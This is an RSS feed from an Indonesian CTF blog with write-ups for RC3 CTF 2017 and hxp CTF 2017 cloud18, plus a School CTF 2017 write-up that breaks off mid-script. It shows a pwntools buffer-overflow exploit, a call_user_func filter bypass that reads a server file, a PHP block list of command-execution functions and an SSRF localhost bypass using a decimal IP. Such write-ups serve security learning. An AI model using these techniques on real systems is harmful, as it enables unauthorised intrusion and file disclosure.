<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>CTF.Ninja</title>
    <description>CTF, InfoSec, Banana And More.
</description>
    <link>https://rhama.my.id/</link>
    <atom:link href="https://rhama.my.id/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 20 Nov 2017 14:44:07 +0700</pubDate>
    <lastBuildDate>Mon, 20 Nov 2017 14:44:07 +0700</lastBuildDate>
    <generator>Jekyll v3.2.1</generator>
    
      <item>
        <title>RC3 CTF 2017 Write Up</title>
        <description>&lt;h1 id=&quot;reversing-100&quot;&gt;Reversing (100)&lt;/h1&gt;

&lt;p&gt;Diberikan file elf 64bit not stripped.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;file hello
hello: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;e85915bc2c95f7eac6c02254b065d9161e5efca2, not stripped
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Hanya dengan menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; didapatkan Flag yang benar.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;strings hello | grep RC
RC3-2017&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;little_ball_of_fur&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Cukup mudah untuk challenge dengan points 100 :)&lt;/p&gt;

&lt;p&gt;Flag : &lt;code class=&quot;highlighter-rouge&quot;&gt;RC3-2017{little_ball_of_fur}&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;web-100&quot;&gt;Web (100)&lt;/h1&gt;

&lt;p&gt;Diberikan sebuah website &lt;a href=&quot;http://13.59.6.98&quot;&gt;http://13.59.6.98&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;curl http://13.59.6.98
&amp;lt;meta http-equiv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;refresh&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0; url=C.html&quot;&lt;/span&gt; /&amp;gt; &amp;lt;p hidden&amp;gt;R&amp;lt;/p&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Website tersebut akan otomatis direfresh apabila dikunjungi via Browser. Tapi terdapat bagian &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;p hidden&amp;gt;R&amp;lt;/p&amp;gt;&lt;/code&gt; yang seperti nya adalah flag nya apabila mengikuti bagian &lt;code class=&quot;highlighter-rouge&quot;&gt;url=C.html&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Berikut script yang digunakan untuk melakukan automasi.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://13.59.6.98&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;p hidden&amp;gt;(.*?)&amp;lt;/p&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;777&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Flag : {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://13.59.6.98/{}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;url=(.*?)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Setelah menunggu beberapa saat Flag akan muncul.&lt;/p&gt;

&lt;p&gt;Flag : &lt;code class=&quot;highlighter-rouge&quot;&gt;RC3W3MUS7G0D33P3RR3D1R3C777&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;pwn-100&quot;&gt;Pwn (100)&lt;/h1&gt;

&lt;p&gt;Diberikan sebuah file elf 32bit stripped bernama &lt;code class=&quot;highlighter-rouge&quot;&gt;easy_peasy&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;file easy_peasy 
easy_peasy: ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-linux.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.24, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3a5dd5cc49b1a8efbc0a6269bdea9c1da99b3bcf, stripped
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;checksec easy_peasy 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'easy_peasy'&lt;/span&gt;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x8048000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Hasi decompile menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;IDA PRO&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;void __cdecl main()
{
  int v0; // [sp+18h] [bp-18h]@1
  int v1; // [sp+28h] [bp-8h]@1
  int v2; // [sp+2Ch] [bp-4h]@1

  v2 = 0;
  v1 = 0;
  printf(&quot;Enter Key: &quot;);
  gets((char *)&amp;amp;v0);
  if ( v2 == 0xCAFEF00D &amp;amp;&amp;amp; v1 == 0xC0FFEE )
    sub_80484EF();
  puts(&quot;Error: Invalid key!&quot;);
  srand(1u);
  init();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Terlihat penggunaan fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; yang vulnerable &lt;em&gt;Buffer Overflow&lt;/em&gt;. Dan seperti nya tujuan dari challenge ini adalah melakukan &lt;em&gt;Overwrite Local Variable&lt;/em&gt; v1 dan v2.&lt;/p&gt;

&lt;p&gt;Perhitungan Padding.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;  int v0; // [sp+18h] [bp-18h]@1
  int v1; // [sp+28h] [bp-8h]@1
  int v2; // [sp+2Ch] [bp-4h]@1
&lt;/code&gt;&lt;/pre&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# jumlah padding untuk overwrite v1&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt; 
&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# jumlah padding untuk overwrite v2&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Berikut script yang digunakan&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;baby&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;18.216.183.46&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xC0FFEE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# v1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xCAFEF00D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# v2&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;baby&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;baby&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;RC3-2017{S3E_N0T_TO0_B4D_HUH_ec1368b59b858e08}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;task-files--rc3-ctf-2017http1270014000taskfilerc3-ctf-2017&quot;&gt;Task Files : &lt;a href=&quot;http://127.0.0.1:4000/task_file/RC3-CTF-2017/&quot;&gt;RC3-CTF-2017&lt;/a&gt;&lt;/h2&gt;
</description>
        <pubDate>Mon, 20 Nov 2017 00:00:00 +0700</pubDate>
        <link>https://rhama.my.id/ctf/2017/11/20/rc3-ctf-2017.html</link>
        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/11/20/rc3-ctf-2017.html</guid>
        
        <category>rc3ctf</category>
        
        <category>CTF</category>
        
        
        <category>CTF</category>
        
      </item>
    
      <item>
        <title>hxp CTF 2017 - cloud18 (web 150)</title>
        <description>&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;We also did an online text editor! We also made it, like, super secure! We are so confident that we even give you the source code.
Download:

&lt;a href=&quot;https://2017.ctf.link/assets/files/65e868ae9518a3fd226e71d4041be9d4cd8350d7552b46832f3e7f0b5d6e03af.tar.xz&quot;&gt;65e868ae9518a3fd226e71d4041be9d4cd8350d7552b46832f3e7f0b5d6e03af.tar.xz&lt;/a&gt;
Connection:

&lt;span style=&quot;color:#e18964;text-decoration:underline;&quot;&gt;http://35.198.105.111:5475/&lt;/span&gt;

&lt;/pre&gt;
&lt;p&gt;Diberikan sebuah website beserta source code nya. Tampilan awal web tersebut hanya terdapat form login dan register. fungsi web tersebut adalah online editor, fungsi editor sendiri akan muncul setelah user login.
&lt;img class=&quot;wp-image-104 size-lodestar-featured-image aligncenter&quot; src=&quot;https://bytetolong.files.wordpress.com/2017/11/screenshot_2017-11-19_12-54-41.png?w=610&amp;amp;h=565&amp;amp;crop=1&quot; alt=&quot;&quot; width=&quot;610&quot; height=&quot;565&quot; /&gt;
Berikut daftar file source code yang diberikan&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;$ ls
editor.php  index.php  logout.php  register.php  stylesheet.css  User.php
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Snippet editor.php&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (preg_match(&quot;/exec|system|passthru|`|proc_open|popen/&quot;, strtolower($_POST[&quot;method&quot;].$_POST[&quot;text&quot;])) != 0) {
    exit(&quot;Do you really think you could pass something to the command line? Functions like this are often disabled! Maybe have a look at the source?&quot;);
}
...............
    $editedText = preg_replace_callback(&quot;/&quot; . $_POST[&quot;regex&quot;] . &quot;/&quot;, function ($matches) {
        return call_user_func($_POST[&quot;method&quot;], $matches[0]);
    }, $_POST[&quot;text&quot;]);
    if($editedText) {
        echo(&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'alert success'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&quot; . $editedText . &quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&quot;);
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Snippet index.php&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    if($_SESSION[&quot;user&quot;]){
        echo &quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'alert success'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;login sucessful&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&quot;;
        if($_SESSION[&quot;user&quot;]-&amp;gt;getName() === &quot;admin&quot;){
            echo &quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'alert success'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&quot; . shell_exec(&quot;/usr/bin/get_flag&quot;) . &quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&quot;;
        }
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Dari source code editor.php, diketahui text inputan akan di edit akan dicocokan dengan &lt;em&gt;regex&lt;/em&gt; lalu me return hasil dari fungsi &lt;em&gt;call_user_func&lt;/em&gt;.
fungsi dari &lt;em&gt;call_user_func&lt;/em&gt; adalah untuk memanggil suatu fungsi, yang dimana parameter pertama nya adalah nama fungsi itu sendiri dan paramter kedua adalah parameter untuk fungsi yang ingin dipanggil.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;call_user_func(“system”,”id”)&lt;/em&gt;&lt;/strong&gt; akan memanggil fungsi &lt;em&gt;system(“id”)&lt;/em&gt;. Tapi karena terdapat filter nama fungsi, fungsi untuk eksekusi external program tidak bisa di digunakan. Karena parameter untuk nama fungsi di ambil dari &lt;strong&gt;$_POST[“method”]&lt;/strong&gt; dalam hal ini kita bisa memanipulasi nama fungsi yang dipanggil &lt;em&gt;call_user_func&lt;/em&gt; dengan memodifikasi value dari method itu sendiri via inspect element.&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;nt&quot;&gt;&amp;lt;select&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;method&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;option&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;disabled&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;selected&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;select a method&lt;span class=&quot;nt&quot;&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;option&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;strtoupper&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;to upper case&lt;span class=&quot;nt&quot;&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;option&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;strtolower&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;to lower case&lt;span class=&quot;nt&quot;&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;option&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ucfirst&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;first letter to upper case&lt;span class=&quot;nt&quot;&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/select&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Berdasarkan source code index.php, lokasi flag berada di &lt;strong&gt;“/usr/bin/get_flag”&lt;/strong&gt;. Oleh karena itu bisa digunakan fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;readfile&lt;/code&gt; untuk membaca isi dari &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/get_flag&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img class=&quot;aligncenter wp-image-103 size-lodestar-featured-image&quot; src=&quot;https://bytetolong.files.wordpress.com/2017/11/screenshot_2017-11-19_13-11-47.png?w=593&amp;amp;h=546&amp;amp;crop=1&quot; alt=&quot;&quot; width=&quot;593&quot; height=&quot;546&quot; /&gt;
Gunanya regex : &lt;strong&gt;^[ -~]+$&lt;/strong&gt; adalah agar match dengan semua dengan karakter yang di input pada bagian text.&lt;/p&gt;

&lt;p&gt;Setelah disubmit, akan muncul isi dari &lt;em&gt;/usr/bin/get_flag&lt;/em&gt;. tinggal CTR + F “hxp” untuk mendapatkan string Flag.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Flag : hxp{Th1s_w2sn’t_so_h4rd_now_do_web_of_ages!!!Sorry_f0r_f1rst_sh1tty_upload}&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 20 Nov 2017 00:00:00 +0700</pubDate>
        <link>https://rhama.my.id/ctf/web%20hacking/2017/11/20/hxpctf-2017-web150.html</link>
        <guid isPermaLink="true">https://rhama.my.id/ctf/web%20hacking/2017/11/20/hxpctf-2017-web150.html</guid>
        
        <category>hxpctf-2017</category>
        
        <category>CTF</category>
        
        
        <category>CTF</category>
        
        <category>Web Hacking</category>
        
      </item>
    
      <item>
        <title>School CTF 2017 Write Up</title>
        <description>&lt;h1&gt;&lt;strong&gt;Website&lt;/strong&gt;&lt;/h1&gt;
&lt;h2&gt;&lt;strong&gt;Web100 (Self Signed)
&lt;/strong&gt;&lt;/h2&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;When they ask me should I trust SchoolCTF or not - the answer is obvious!

&lt;a href=&quot;https://secured.task.school-ctf.org/&quot;&gt;Task URL&lt;/a&gt;
&lt;/pre&gt;
&lt;p&gt;Situs tersebut menggunakan self signed ssl, dan Flag nya terdapat pada bagian Organizational unit (OU).&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;curl -v &lt;span style=&quot;color:#e18964;text-decoration:underline;&quot;&gt;https://secured.task.school-ctf.org/&lt;/span&gt; -k --silent -I
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Flag : SchoolCTF{n0t_so+$eCur3}&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Web200 (Port Scan)
&lt;/strong&gt;&lt;/h2&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;Pretending to be a simple front-developer Frank The Hacker, 
who is a hacker, wrote his cloud analog nmap and he plans an ICO, 
but it seems there is an error which makes it possible to know one of Frank's secrets.

Can you find it?

&lt;a href=&quot;http://portscan.task.school-ctf.org/&quot;&gt;Task URL&lt;/a&gt;
&lt;/pre&gt;
&lt;p&gt;Web tersebut menyediakan fasilitas scan port. dimana terdapat 2 fitur,&lt;/p&gt;

&lt;p&gt;yang pertama ‘&lt;em&gt;Scan the host to get the list of open ports&lt;/em&gt;’&lt;/p&gt;

&lt;p&gt;&lt;img class=&quot;wp-image-86 size-lodestar-featured-image aligncenter&quot; src=&quot;https://bytetolong.files.wordpress.com/2017/11/screenshot_2017-11-10_16-04-35.png?w=843&amp;amp;h=446&amp;amp;crop=1&quot; alt=&quot;&quot; width=&quot;843&quot; height=&quot;446&quot; /&gt;&lt;/p&gt;

&lt;p&gt;terlihat port 31337 dengan service &lt;em&gt;SchoolCTF Flag Server&lt;/em&gt; dalam keadaan Open.&lt;/p&gt;

&lt;p&gt;Yang kedua “&lt;em&gt;Identify the single port on the host&lt;/em&gt;”&lt;/p&gt;

&lt;p&gt;Tetapi apabila me scan “localhost” atau “127.0.0.1” akan mengeluarkan pesan ‘&lt;em&gt;Identifying ports of internal hosts is prohibited&lt;/em&gt; ‘.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Possible SSRF&lt;/strong&gt;&lt;/em&gt; ?&lt;/p&gt;

&lt;p&gt;Untuk membypass nya bisa dengan merubah ip “127.0.0.1” menjadi Long/Decimal, sehingga bisa menggunakan fitur kedua untuk mendapatkan flag dari port 31337.&lt;/p&gt;

&lt;p&gt;Berikut script yang digunakan untuk mendapatkan Flag.&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;import&lt;/span&gt; requests
&lt;span style=&quot;color:#e28964;&quot;&gt;from&lt;/span&gt; socket &lt;span style=&quot;color:#e28964;&quot;&gt;import&lt;/span&gt; inet_aton
